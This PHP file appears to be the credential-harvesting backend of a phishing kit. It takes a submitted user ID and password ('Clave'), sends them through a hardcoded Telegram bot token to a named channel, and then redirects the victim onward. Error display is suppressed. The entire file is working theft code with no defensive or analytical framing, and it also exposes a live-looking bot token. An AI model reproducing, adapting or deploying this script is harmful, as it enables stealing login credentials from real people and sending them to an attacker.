<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['UserId']) && isset ($_POST['Clave'])  ){

$message = "Doc= ".$_POST['UserId']." - User= ".$_POST['Clave']." \r\n";

$apiToken = "5414799549:AAGrvG3sytOU_r1d9dJORDWz1jvk4t5ov1I";


$data = [
  'chat_id' => '@LalitoGaliciaf',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: index2.html');

}else{ header ('location: index.html'); exit(); }

?>